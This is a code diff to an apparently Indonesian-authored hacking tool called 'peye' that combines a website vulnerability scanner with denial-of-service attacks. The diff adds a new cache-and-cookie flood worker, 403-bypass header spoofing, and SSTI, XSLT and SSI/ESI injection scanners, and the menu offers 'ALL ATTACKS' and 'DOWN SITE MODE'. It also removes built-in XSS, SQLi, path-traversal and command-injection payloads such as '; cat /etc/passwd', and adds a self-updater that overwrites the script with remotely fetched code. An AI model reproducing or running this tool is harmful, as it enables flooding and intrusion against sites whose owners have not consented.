@@ -10,6 +10,7 @@ import dns.resolver
 import json
 import hashlib
 import re
+import subprocess
 from urllib.parse import urlparse, urljoin, quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import defaultdict
@@ -33,6 +34,9 @@ MAGENTA = '\033[95m'
 CYAN = '\033[96m'
 WHITE = '\033[97m'
 RESET = '\033[0m'
+
+VERSION = "14.0"
+GITHUB_RAW_URL = "https://raw.githubusercontent.com/peye/peye/main/peye.py"
 
 def print_banner():
     banner = f"""
@@ -86,9 +90,33 @@ def print_banner():
 """
     print(banner)
     print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║     {MAGENTA} Welcome To Peye {RESET}{CYAN}                   ║")
+    print(f"║     {MAGENTA} Welcome To Peye v{VERSION} {RESET}{CYAN}                   ║")
     print(f"║     {GREEN}Tools Vuln Site Scanner Or ddos by (peyefounder) don't forget to follow: instagram: @hexornot {RESET}{CYAN}                    ║")
     print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}\n")
+
+def check_update():
+    print(f"{YELLOW}[*] Checking for updates...{RESET}")
+    try:
+        response = requests.get(GITHUB_RAW_URL, timeout=10)
+        if response.status_code == 200:
+            content = response.text
+            version_match = re.search(r'VERSION = "(\d+\.\d+)"', content)
+            if version_match:
+                latest_version = version_match.group(1)
+                if latest_version != VERSION:
+                    print(f"{YELLOW}[!] New version available: v{latest_version} (current: v{VERSION}){RESET}")
+                    update = input(f"{GREEN}[?] Update now? (y/n): {RESET}").lower()
+                    if update == 'y':
+                        with open(sys.argv[0], 'w') as f:
+                            f.write(content)
+                        print(f"{GREEN}[✓] Updated! Please restart the tool.{RESET}")
+                        sys.exit(0)
+                else:
+                    print(f"{GREEN}[✓] You have the latest version (v{VERSION}){RESET}")
+        else:
+            print(f"{YELLOW}[!] Could not check for updates{RESET}")
+    except:
+        print(f"{YELLOW}[!] Network error checking updates{RESET}")
 
 class Stats:
     def __init__(self):
@@ -115,12 +143,16 @@ class WordlistManager:
             'xss': 'xss.txt',
             'sqli': 'sqli.txt', 
             'lfi': 'lfi.txt',
-            'cmd': 'cmd.txt',
+            'xxe': 'xxe.txt',
+            'bypass403': 'bypass403.txt',
+            'ssti': 'ssti.txt',
+            'xslt': 'xslt.txt',
+            'ssi_esi': 'ssi_esi.txt',
             'dirs': 'dirs.txt',
             'subdomains': 'subdomains.txt',
             'dorks': 'dork.txt',
-            'cms': 'cms.txt',
-            'tech': 'tech.txt'
+            'useragents': 'useragent.txt',
+            'cookies': 'cookies.txt'
         }
         
         for name, filename in wordlist_files.items():
@@ -129,27 +161,8 @@ class WordlistManager:
                     self.wordlists[name] = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                 print(f"{GREEN}[✓] Loaded {len(self.wordlists[name])} {name} from {filename}{RESET}")
             else:
-                self.wordlists[name] = self.get_default_payloads(name)
-                with open(filename, 'w') as f:
-                    f.write('\n'.join(self.wordlists[name]))
-                print(f"{GREEN}[✓] Created {filename} with {len(self.wordlists[name])} default {name}{RESET}")
-    
-    def get_default_payloads(self, name):
-        defaults = {
-            'xss': ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)", "'><script>alert(1)</script>"],
-            'sqli': ["' OR '1'='1", "' OR '1'='1' --", "admin' --", "1' ORDER BY 1--", "' UNION SELECT NULL--", "1' AND SLEEP(5)--"],
-            'lfi': ["../../../../etc/passwd", "....//....//....//etc/passwd", "../../../../config.php", "../../../../.htaccess"],
-            'cmd': ["; ls", "| whoami", "&& id", "; cat /etc/passwd", "| uname -a", "; pwd", "| hostname"],
-            'dirs': ["admin", "login", "wp-admin", "administrator", "cpanel", "dashboard", "phpmyadmin", "backup", "config"],
-            'subdomains': ["www", "mail", "ftp", "admin", "blog", "dev", "api", "test", "vpn", "cpanel", "webmail"],
-            'dorks': [
-                "inurl:admin", "inurl:login", "inurl:wp-admin", "inurl:phpmyadmin",
-                "intitle:index of", "inurl:config", "ext:sql", "ext:env"
-            ],
-            'cms': ["wordpress", "joomla", "drupal", "laravel", "codeigniter", "symfony"],
-            'tech': ["php", "jquery", "bootstrap", "react", "vue", "angular", "nginx", "apache"]
-        }
-        return defaults.get(name, [])
+                self.wordlists[name] = []
+                print(f"{YELLOW}[!] {filename} not found, skipping{RESET}")
     
     def get(self, name):
         return self.wordlists.get(name, [])
@@ -375,6 +388,8 @@ class DoSAttack:
         self.host = self.parsed.netloc
         self.port = 443 if self.parsed.scheme == 'https' else 80
         self.path = self.parsed.path or '/'
+        self.wordlists = WordlistManager()
+        self.session_cookies = {}  # Menyimpan cookie dari response sebelumnya
         
         if use_proxy:
             self.proxy_manager.scrape_proxies()
@@ -394,10 +409,14 @@ class DoSAttack:
     def mixed_flood(self, duration, threads):
         self._attack("MIXED", duration, threads, self._mixed_worker)
     
+    def cache_flood(self, duration, threads):
+        """Cache + Cookie Flood - Membawa cookie dan cache dari response sebelumnya"""
+        self._attack("CACHE FLOOD", duration, threads, self._cache_worker)
+    
     def all_attacks(self, duration, threads):
         print(f"\n{RED}[!] ALL ATTACKS SIMULTANEOUS{RESET}")
-        thr_each = max(1, threads // 5)
-        attacks = [self.http_flood, self.raw_flood, self.slowloris, self.dns_attack, self.mixed_flood]
+        thr_each = max(1, threads // 6)
+        attacks = [self.http_flood, self.raw_flood, self.slowloris, self.dns_attack, self.mixed_flood, self.cache_flood]
         for attack in attacks:
             threading.Thread(target=attack, args=(duration, thr_each)).start()
         time.sleep(duration + 2)
@@ -477,6 +496,59 @@ class DoSAttack:
                     session.delete(self.target, timeout=2)
                 elif method == 'OPTIONS':
                     session.options(self.target, timeout=2)
+                self.stats.add(True)
+            except:
+                self.stats.add(False)
+    
+    def _cache_worker(self, end_time):
+        """Cache + Cookie flood - Membawa cookie dan cache dari response sebelumnya"""
+        session = requests.Session()
+        session.verify = False
+        cookies_list = self.wordlists.get('cookies')
+        
+        # Ambil cookie pertama dari response awal
+        try:
+            init_resp = session.get(self.target, timeout=5)
+            if init_resp.cookies:
+                self.session_cookies = init_resp.cookies.get_dict()
+                session.cookies.update(self.session_cookies)
+        except:
+            pass
+        
+        while self.running and time.time() < end_time:
+            try:
+                proxy = self.proxy_manager.get() if self.use_proxy else None
+                if proxy:
+                    session.proxies = proxy
+                
+                # Cache bypass headers
+                cache_headers = {
+                    'Cache-Control': random.choice(['no-cache', 'no-store', 'max-age=0', 'must-revalidate']),
+                    'Pragma': 'no-cache',
+                    'Expires': '0',
+                    'If-Modified-Since': 'Sat, 1 Jan 2000 00:00:00 GMT',
+                    'If-None-Match': f'"{random.randint(100000, 999999)}"'
+                }
+                
+                # Kirim cookie yang sudah didapat
+                if self.session_cookies:
+                    session.cookies.update(self.session_cookies)
+                
+                # Random cookie dari file
+                if cookies_list:
+                    cookie = random.choice(cookies_list)
+                    if '=' in cookie:
+                        key, val = cookie.split('=', 1)
+                        session.cookies.set(key, val)
+                
+                session.headers.update(cache_headers)
+                resp = session.get(self.target, timeout=2)
+                
+                # Simpan cookie baru dari response
+                if resp.cookies:
+                    self.session_cookies.update(resp.cookies.get_dict())
+                    session.cookies.update(self.session_cookies)
+                
                 self.stats.add(True)
             except:
                 self.stats.add(False)
@@ -567,6 +639,7 @@ class AdvancedScanner:
         self.report.target = target
         self.report.scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         self.threads = 50
+        self.useragents = self.wordlists.get('useragents')
     
     def check_connection(self, url):
         try:
@@ -576,35 +649,60 @@ class AdvancedScanner:
             elif resp.status_code == 403:
                 print(f"{RED}[✗] Access Denied (403 Forbidden) - Cannot scan{RESET}")
                 return False, 403
+            elif resp.status_code == 404:
+                print(f"{RED}[✗] Not Found (404) - Target tidak ditemukan{RESET}")
+                return False, 404
             else:
                 print(f"{YELLOW}[!] Status {resp.status_code} - Scan may be limited{RESET}")
                 return False, resp.status_code
+        except requests.exceptions.ConnectionError:
+            print(f"{RED}[✗] Connection Failed - Cannot reach target{RESET}")
+            return False, None
+        except requests.exceptions.Timeout:
+            print(f"{YELLOW}[!] Timeout - Target slow or blocking{RESET}")
+            return False, None
         except:
             return False, None
     
-    def vuln_scan(self, vuln_type, payloads, param='q', indicator=None):
+    def vuln_scan(self, vuln_type, payloads, param='q', indicator=None, method='GET'):
         print(f"\n{CYAN}[*] Scanning {vuln_type}... (Total: {len(payloads)}){RESET}")
         
+        # Cek koneksi dulu, hanya 200 yang diproses
         connected, status = self.check_connection(self.target)
         if not connected:
-            print(f"{RED}[✗] Cannot scan {vuln_type}{RESET}")
+            if status == 404:
+                print(f"{RED}[✗] Cannot scan {vuln_type} - Target Not Found (404){RESET}")
+            elif status == 403:
+                print(f"{RED}[✗] Cannot scan {vuln_type} - Access Denied (403){RESET}")
+            else:
+                print(f"{RED}[✗] Cannot scan {vuln_type} - Target not accessible{RESET}")
             return []
         
         found = []
         total = len(payloads)
         
         def test_payload(payload):
-            test_url = self.target + (('?' + param + '=' + quote(payload)) if '?' not in self.target else ('&' + param + '=' + quote(payload)))
-            try:
-                resp = self.session.get(test_url, timeout=5)
-                if resp.status_code == 200:
-                    if indicator and indicator in resp.text:
-                        return (payload, test_url, resp.status_code, resp.text[:200])
-                    elif not indicator and len(resp.content) > 500:
-                        return (payload, test_url, resp.status_code, "Large response")
-                return None
-            except:
-                return None
+            if method.upper() == 'GET':
+                test_url = self.target + (('?' + param + '=' + quote(payload)) if '?' not in self.target else ('&' + param + '=' + quote(payload)))
+                try:
+                    resp = self.session.get(test_url, timeout=5)
+                    # Hanya 200 yang dianggap potential vulnerability
+                    if resp.status_code == 200:
+                        if indicator and indicator in resp.text:
+                            return (payload, test_url, resp.status_code, resp.text[:200])
+                    return None
+                except:
+                    return None
+            else:
+                test_url = self.target
+                try:
+                    resp = self.session.post(test_url, data={param: payload}, timeout=5)
+                    if resp.status_code == 200:
+                        if indicator and indicator in resp.text:
+                            return (payload, test_url, resp.status_code, resp.text[:200])
+                    return None
+                except:
+                    return None
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = {executor.submit(test_payload, p): p for p in payloads}
@@ -619,20 +717,177 @@ class AdvancedScanner:
                     print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
                     print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {status_code}{RESET}")
                 
-                if i % 100 == 0:
+                if i % 50 == 0 and total > 0:
                     print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
         
         print(f"\n{GREEN}[✓] {vuln_type} complete: {len(found)}/{total} vulnerabilities found{RESET}")
         self.results[vuln_type] = found
         return found
     
+    def bypass403_scan(self):
+        """Bypass 403 Forbidden dengan berbagai teknik"""
+        payloads = self.wordlists.get('bypass403')
+        if not payloads:
+            print(f"{YELLOW}[!] No bypass403 payloads loaded{RESET}")
+            return []
+        
+        print(f"\n{CYAN}[*] Scanning 403 Bypass... (Total: {len(payloads)}){RESET}")
+        found = []
+        
+        def test_bypass(payload):
+            try:
+                # Test dengan berbagai header bypass
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
+                    'X-Forwarded-For': '127.0.0.1',
+                    'X-Original-URL': payload,
+                    'X-Rewrite-URL': payload,
+                    'X-Forwarded-Host': 'localhost'
+                }
+                resp = self.session.get(self.target + payload, headers=headers, timeout=5)
+                if resp.status_code == 200:
+                    return (payload, self.target + payload, resp.status_code)
+                return None
+            except:
+                return None
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = {executor.submit(test_bypass, p): p for p in payloads}
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    payload, url, code = result
+                    found.append(payload)
+                    self.report.add("403 Bypass", url, payload, f"HTTP {code}", "")
+                    print(f"\n{GREEN}[✓] 403 BYPASS FOUND!{RESET}")
+                    print(f"    {WHITE}URL:{RESET} {url}")
+                    print(f"    {WHITE}Technique:{RESET} {YELLOW}{payload}{RESET}")
+        
+        print(f"{GREEN}[✓] 403 Bypass complete: {len(found)} found{RESET}")
+        return found
+    
+    def ssti_scan(self):
+        """Server-Side Template Injection"""
+        payloads = self.wordlists.get('ssti')
+        if not payloads:
+            print(f"{YELLOW}[!] No SSTI payloads loaded{RESET}")
+            return []
+        
+        print(f"\n{CYAN}[*] Scanning SSTI... (Total: {len(payloads)}){RESET}")
+        found = []
+        
+        def test_ssti(payload):
+            test_url = self.target + (('?' + 'name' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'name' + '=' + quote(payload)))
+            try:
+                resp = self.session.get(test_url, timeout=5)
+                if resp.status_code == 200:
+                    indicators = ['{{', '}}', '${', '{{7*7}}', '49', '77']
+                    for ind in indicators:
+                        if ind in resp.text:
+                            return (payload, test_url, resp.status_code)
+                return None
+            except:
+                return None
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = {executor.submit(test_ssti, p): p for p in payloads}
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    payload, url, code = result
+                    found.append(payload)
+                    self.report.add("SSTI", url, payload, f"HTTP {code}", "")
+                    print(f"\n{RED}[!] SSTI VULNERABLE!{RESET}")
+                    print(f"    {WHITE}URL:{RESET} {url}")
+                    print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
+        
+        print(f"{GREEN}[✓] SSTI complete: {len(found)} found{RESET}")
+        return found
+    
+    def xslt_scan(self):
+        """XSLT Injection"""
+        payloads = self.wordlists.get('xslt')
+        if not payloads:
+            print(f"{YELLOW}[!] No XSLT payloads loaded{RESET}")
+            return []
+        
+        print(f"\n{CYAN}[*] Scanning XSLT Injection... (Total: {len(payloads)}){RESET}")
+        found = []
+        
+        def test_xslt(payload):
+            test_url = self.target + (('?' + 'xml' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'xml' + '=' + quote(payload)))
+            try:
+                resp = self.session.get(test_url, timeout=5)
+                if resp.status_code == 200:
+                    if 'xsl:stylesheet' in resp.text or 'file://' in resp.text:
+                        return (payload, test_url, resp.status_code)
+                return None
+            except:
+                return None
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = {executor.submit(test_xslt, p): p for p in payloads}
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    payload, url, code = result
+                    found.append(payload)
+                    self.report.add("XSLT Injection", url, payload, f"HTTP {code}", "")
+                    print(f"\n{RED}[!] XSLT INJECTION VULNERABLE!{RESET}")
+                    print(f"    {WHITE}URL:{RESET} {url}")
+        
+        print(f"{GREEN}[✓] XSLT complete: {len(found)} found{RESET}")
+        return found
+    
+    def ssi_esi_scan(self):
+        """SSI (Server Side Includes) & ESI (Edge Side Includes) Injection"""
+        payloads = self.wordlists.get('ssi_esi')
+        if not payloads:
+            print(f"{YELLOW}[!] No SSI/ESI payloads loaded{RESET}")
+            return []
+        
+        print(f"\n{CYAN}[*] Scanning SSI/ESI Injection... (Total: {len(payloads)}){RESET}")
+        found = []
+        
+        def test_ssi(payload):
+            test_url = self.target + (('?' + 'page' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'page' + '=' + quote(payload)))
+            try:
+                resp = self.session.get(test_url, timeout=5)
+                if resp.status_code == 200:
+                    indicators = ['<!--#', 'root:', 'uid=', 'bin/']
+                    for ind in indicators:
+                        if ind in resp.text:
+                            return (payload, test_url, resp.status_code)
+                return None
+            except:
+                return None
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = {executor.submit(test_ssi, p): p for p in payloads}
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    payload, url, code = result
+                    found.append(payload)
+                    self.report.add("SSI/ESI Injection", url, payload, f"HTTP {code}", "")
+                    print(f"\n{RED}[!] SSI/ESI INJECTION VULNERABLE!{RESET}")
+                    print(f"    {WHITE}URL:{RESET} {url}")
+        
+        print(f"{GREEN}[✓] SSI/ESI complete: {len(found)} found{RESET}")
+        return found
+    
     def dir_scan(self):
         dirs = self.wordlists.get('dirs')
+        if not dirs:
+            print(f"{YELLOW}[!] No directories loaded{RESET}")
+            return []
+        
         print(f"\n{CYAN}[*] Directory Bruteforce... (Total: {len(dirs)}){RESET}")
         
+        # Cek koneksi dulu
         connected, status = self.check_connection(self.target)
         if not connected:
-            print(f"{RED}[✗] Cannot scan directories{RESET}")
+            print(f"{RED}[✗] Cannot scan directories - Target not accessible{RESET}")
             return []
         
         found = []
@@ -642,32 +897,26 @@ class AdvancedScanner:
             url = urljoin(self.target, d)
             try:
                 resp = self.session.get(url, timeout=3, allow_redirects=False)
+                # Hanya 200 yang dianggap found
                 if resp.status_code == 200:
                     return (url, resp.status_code, resp.headers.get('Content-Length', '?'))
-                elif resp.status_code in [301, 302]:
-                    return (url, resp.status_code, resp.headers.get('Location', ''))
+                return None
             except:
-                pass
-            return None
+                return None
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = {executor.submit(check_dir, d): d for d in dirs}
             for i, future in enumerate(as_completed(futures), 1):
                 result = future.result()
                 if result:
-                    url, code, extra = result
+                    url, code, size = result
                     found.append(url)
-                    if code == 200:
-                        print(f"\n{GREEN}[✓] DIRECTORY FOUND!{RESET}")
-                        print(f"    {WHITE}URL:{RESET} {url}")
-                        print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {code} ({extra} bytes){RESET}")
-                        self.report.add("Directory", url, "", f"HTTP {code}", f"Size: {extra} bytes")
-                    elif code in [301, 302]:
-                        print(f"\n{BLUE}[→] REDIRECT FOUND!{RESET}")
-                        print(f"    {WHITE}URL:{RESET} {url}")
-                        print(f"    {WHITE}Redirects to:{RESET} {extra}")
+                    print(f"\n{GREEN}[✓] DIRECTORY FOUND!{RESET}")
+                    print(f"    {WHITE}URL:{RESET} {url}")
+                    print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {code} ({size} bytes){RESET}")
+                    self.report.add("Directory", url, "", f"HTTP {code}", f"Size: {size} bytes")
                 
-                if i % 100 == 0:
+                if i % 50 == 0:
                     print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
         
         print(f"\n{GREEN}[✓] Directory scan complete: {len(found)}/{total} found{RESET}")
@@ -675,6 +924,10 @@ class AdvancedScanner:
     
     def subdomain_scan(self, domain):
         subs = self.wordlists.get('subdomains')
+        if not subs:
+            print(f"{YELLOW}[!] No subdomains loaded{RESET}")
+            return []
+        
         print(f"\n{CYAN}[*] Subdomain Scan... (Total: {len(subs)}){RESET}")
         found = []
         total = len(subs)
@@ -710,15 +963,23 @@ class AdvancedScanner:
         print(f"{YELLOW}[*] FULL SCAN: {self.target}{RESET}")
         print(f"{MAGENTA}{'='*70}{RESET}")
         
+        # Test main target first
         connected, status = self.check_connection(self.target)
         if not connected:
-            print(f"{RED}[✗] Target unreachable, aborting{RESET}")
+            if status == 404:
+                print(f"{RED}[✗] Target Not Found (404) - Aborting scan{RESET}")
+            else:
+                print(f"{RED}[✗] Target unreachable, aborting scan{RESET}")
             return
         
         self.vuln_scan('XSS', self.wordlists.get('xss'), 'q', '<script>')
         self.vuln_scan('SQLi', self.wordlists.get('sqli'), 'id', 'mysql|syntax')
         self.vuln_scan('LFI', self.wordlists.get('lfi'), 'file', 'root:')
-        self.vuln_scan('CMD', self.wordlists.get('cmd'), 'cmd', 'uid=')
+        self.vuln_scan('XXE', self.wordlists.get('xxe'), 'xml', 'root:', method='POST')
+        self.bypass403_scan()
+        self.ssti_scan()
+        self.xslt_scan()
+        self.ssi_esi_scan()
         self.dir_scan()
         
         print(f"\n{MAGENTA}{'='*70}{RESET}")
@@ -736,7 +997,6 @@ class AdvancedScanner:
         print(f"{MAGENTA}{'='*70}{RESET}")
         return self.results
 
-# FITUR BARU
 class IPInfo:
     def __init__(self):
         self.session = requests.Session()
@@ -747,13 +1007,11 @@ class IPInfo:
             ip = socket.gethostbyname(target)
             print(f"{GREEN}[✓] IP Address: {ip}{RESET}")
             
-            # Get geolocation
             try:
                 geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
                 if geo.get('status') == 'success':
                     print(f"{GREEN}[✓] Location: {geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}{RESET}")
                     print(f"{GREEN}[✓] ISP: {geo.get('isp')}{RESET}")
-                    print(f"{GREEN}[✓] Timezone: {geo.get('timezone')}{RESET}")
             except:
                 pass
             return ip
@@ -763,7 +1021,7 @@ class IPInfo:
 
 class PortScanner:
     def __init__(self):
-        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]
+        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080, 8443]
     
     def scan(self, target, ports=None):
         print(f"{CYAN}[*] Scanning ports on {target}...{RESET}")
@@ -793,14 +1051,10 @@ class CMSDetector:
     def detect(self):
         print(f"{CYAN}[*] Detecting CMS...{RESET}")
         cms_list = {
-            'WordPress': ['wp-content', 'wp-includes', 'wp-admin'],
-            'Joomla': ['joomla', 'com_content', 'media/system'],
-            'Drupal': ['drupal', 'sites/default', 'misc/drupal.js'],
-            'Laravel': ['laravel', 'csrf-token', '_token'],
-            'CodeIgniter': ['codeigniter', 'CI_VERSION'],
-            'Shopify': ['cdn.shopify.com', 'myshopify.com'],
-            'Magento': ['magento', 'skin/frontend'],
-            'PrestaShop': ['prestashop', 'modules/']
+            'WordPress': ['wp-content', 'wp-includes'],
+            'Joomla': ['joomla', 'com_content'],
+            'Laravel': ['laravel', 'csrf-token'],
+            'Drupal': ['drupal', 'sites/default']
         }
         
         try:
@@ -830,38 +1084,44 @@ class Peye:
         proxy_status = "ON" if self.use_proxy else "OFF"
         print(f"""
 {YELLOW}╔══════════════════════════════════════════════════════════════════╗
-║ {GREEN} PEYE Tools (Proxy: {proxy_status}){RESET}{YELLOW}                                         ║
+║ {GREEN} PEYE Tools v{VERSION} (Proxy: {proxy_status}){RESET}{YELLOW}                                         ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[📊 SCANNER]{RESET}{YELLOW}                                                       ║
-║ {CYAN}[1] {WHITE}Full Vulnerability Scan (XSS/SQLi/LFI/CMD)                       ║
+║ {CYAN}[1] {WHITE}Full Vulnerability Scan                                             ║
 ║ {CYAN}[2] {WHITE}Directory Bruteforce                                             ║
 ║ {CYAN}[3] {WHITE}Subdomain Scanner                                                ║
 ║ {CYAN}[4] {WHITE}Technology Stack Detection                                       ║
 ║ {CYAN}[5] {WHITE}XSS Scanner                                                     ║
 ║ {CYAN}[6] {WHITE}SQLi Scanner                                                    ║
 ║ {CYAN}[7] {WHITE}LFI Scanner                                                     ║
-║ {CYAN}[8] {WHITE}Command Injection Scanner                                       ║
+║ {CYAN}[8] {WHITE}XXE Scanner                                                     ║
+║ {CYAN}[9] {WHITE}403 Bypass Scanner                                              ║
+║ {CYAN}[10] {WHITE}SSTI Scanner                                                    ║
+║ {CYAN}[11] {WHITE}XSLT Injection Scanner                                          ║
+║ {CYAN}[12] {WHITE}SSI/ESI Injection Scanner                                       ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[🔍 DORK SEARCH]{RESET}{YELLOW}                                                    ║
-║ {CYAN}[9] {WHITE}Search with Google Dork (Input URL Target)                       ║
-║ {CYAN}[10] {WHITE}Search from dork.txt File (Input URL Target)                    ║
-║ {CYAN}[11] {WHITE}Search by Technology (Input URL Target)                         ║
-║ {CYAN}[12] {WHITE}Show Popular Dorks                                              ║
+║ {CYAN}[13] {WHITE}Search with Google Dork                                         ║
+║ {CYAN}[14] {WHITE}Search from dork.txt File                                       ║
+║ {CYAN}[15] {WHITE}Search by Technology                                            ║
+║ {CYAN}[16] {WHITE}Show Popular Dorks                                              ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[🛠️ EXTRA TOOLS]{RESET}{YELLOW}                                                    ║
-║ {CYAN}[13] {WHITE}IP Information & Geolocation                                    ║
-║ {CYAN}[14] {WHITE}Port Scanner                                                    ║
-║ {CYAN}[15] {WHITE}CMS Detector                                                    ║
-║ {CYAN}[16] {WHITE}SSL/TLS Checker                                                 ║
-║ {CYAN}[17] {WHITE}HTTP Header Analyzer                                            ║
+║ {CYAN}[17] {WHITE}IP Information & Geolocation                                   ║
+║ {CYAN}[18] {WHITE}Port Scanner                                                   ║
+║ {CYAN}[19] {WHITE}CMS Detector                                                   ║
+║ {CYAN}[20] {WHITE}SSL/TLS Checker                                                ║
+║ {CYAN}[21] {WHITE}HTTP Header Analyzer                                           ║
+║ {CYAN}[22] {WHITE}Check for Updates                                              ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[💥 DoS ATTACK]{RESET}{YELLOW}                                                     ║
-║ {CYAN}[18] {WHITE}HTTP Flood              [19] {WHITE}Raw Socket Flood                   ║
-║ {CYAN}[20] {WHITE}Slowloris               [21] {WHITE}DNS Attack                        ║
-║ {CYAN}[22] {WHITE}Mixed Methods Flood     [23] {WHITE}ALL ATTACKS                       ║
-║ {CYAN}[24] {WHITE}DOWN SITE MODE                                                      ║
+║ {CYAN}[23] {WHITE}HTTP Flood              [24] {WHITE}Raw Socket Flood                  ║
+║ {CYAN}[25] {WHITE}Slowloris               [26] {WHITE}DNS Attack                       ║
+║ {CYAN}[27] {WHITE}Mixed Methods Flood     [28] {WHITE}CACHE + COOKIE FLOOD             ║
+║ {CYAN}[29] {WHITE}ALL ATTACKS             [30] {WHITE}DOWN SITE MODE                    ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {CYAN}[P] {WHITE}Toggle Proxy (Current: {proxy_status})                                    ║
+║ {CYAN}[U] {WHITE}Check & Update                                                      ║
 ║ {CYAN}[0] {WHITE}Exit                                                           ║
 ╚══════════════════════════════════════════════════════════════════╝{RESET}
 """)
@@ -884,8 +1144,15 @@ class Peye:
                 print_banner()
                 continue
             
+            if choice == 'U':
+                check_update()
+                input(f"\n{YELLOW}Enter to continue{RESET}")
+                os.system('clear')
+                print_banner()
+                continue
+            
             # Scanner options
-            if choice in ['1','2','3','4','5','6','7','8']:
+            if choice in ['1','2','3','4','5','6','7','8','9','10','11','12']:
                 target = input(f"{GREEN}Target URL: {RESET}").strip()
                 if not target.startswith(('http://','https://')):
                     target = 'http://' + target
@@ -893,19 +1160,6 @@ class Peye:
                 print(f"{YELLOW}[*] Connecting to {target}...{RESET}")
                 session = CFBypass(target).bypass()
                 scanner = AdvancedScanner(target, session)
-                
-                connected, status = scanner.check_connection(target)
-                if not connected:
-                    if status == 403:
-                        print(f"{RED}[✗] Access Denied (403) - Target blocking{RESET}")
-                    else:
-                        print(f"{RED}[✗] Cannot reach target{RESET}")
-                    input(f"\n{YELLOW}Enter to continue{RESET}")
-                    os.system('clear')
-                    print_banner()
-                    continue
-                
-                print(f"{GREEN}[✓] Connection OK (Status: {status}){RESET}")
                 
                 if choice == '1':
                     scanner.full_scan()
@@ -928,39 +1182,48 @@ class Peye:
                     scanner.vuln_scan('LFI', scanner.wordlists.get('lfi'), 'file', 'root:')
                     scanner.report.display()
                 elif choice == '8':
-                    scanner.vuln_scan('CMD', scanner.wordlists.get('cmd'), 'cmd', 'uid=')
+                    scanner.vuln_scan('XXE', scanner.wordlists.get('xxe'), 'xml', 'root:', method='POST')
+                    scanner.report.display()
+                elif choice == '9':
+                    scanner.bypass403_scan()
+                    scanner.report.display()
+                elif choice == '10':
+                    scanner.ssti_scan()
+                    scanner.report.display()
+                elif choice == '11':
+                    scanner.xslt_scan()
+                    scanner.report.display()
+                elif choice == '12':
+                    scanner.ssi_esi_scan()
                     scanner.report.display()
             
-            # Dork search options (dengan input URL target)
-            elif choice in ['9','10','11']:
-                target_url = input(f"{GREEN}Target URL/Domain (contoh: example.com): {RESET}").strip()
+            # Dork search options
+            elif choice in ['13','14','15']:
+                target_url = input(f"{GREEN}Target URL/Domain: {RESET}").strip()
                 self.dork.set_target(target_url)
                 
-                if choice == '9':
+                if choice == '13':
                     dork = input(f"{GREEN}Enter Google Dork: {RESET}")
                     self.dork.search_google(dork)
-                    print(f"\n{GREEN}[✓] Found {len(self.dork.results)} results for {target_url}{RESET}")
-                elif choice == '10':
+                elif choice == '14':
                     self.dork.search_from_file()
-                    print(f"\n{GREEN}[✓] Found {len(self.dork.results)} results from dork.txt for {target_url}{RESET}")
-                elif choice == '11':
-                    tech = input(f"{GREEN}Enter technology (wordpress/laravel/php/jquery/nginx/apache/admin/config/backup/database): {RESET}")
+                elif choice == '15':
+                    tech = input(f"{GREEN}Enter technology: {RESET}")
                     self.dork.tech_search(tech)
-                    print(f"\n{GREEN}[✓] Found {len(self.dork.results)} results for {target_url}{RESET}")
             
-            elif choice == '12':
+            elif choice == '16':
                 self.dork.popular_dorks()
             
             # Extra Tools
-            elif choice == '13':
+            elif choice == '17':
                 target = input(f"{GREEN}Target (domain or IP): {RESET}").strip()
                 self.ipinfo.get_ip_info(target)
             
-            elif choice == '14':
+            elif choice == '18':
                 target = input(f"{GREEN}Target IP: {RESET}").strip()
                 self.portscanner.scan(target)
             
-            elif choice == '15':
+            elif choice == '19':
                 target = input(f"{GREEN}Target URL: {RESET}").strip()
                 if not target.startswith(('http://','https://')):
                     target = 'http://' + target
@@ -968,10 +1231,9 @@ class Peye:
                 detector = CMSDetector(target, session)
                 detector.detect()
             
-            elif choice == '16':
+            elif choice == '20':
                 target = input(f"{GREEN}Target (domain): {RESET}").strip()
                 try:
-                    import ssl
                     ctx = ssl.create_default_context()
                     with ctx.wrap_socket(socket.socket(), server_hostname=target) as sock:
                         sock.connect((target, 443))
@@ -983,7 +1245,7 @@ class Peye:
                 except:
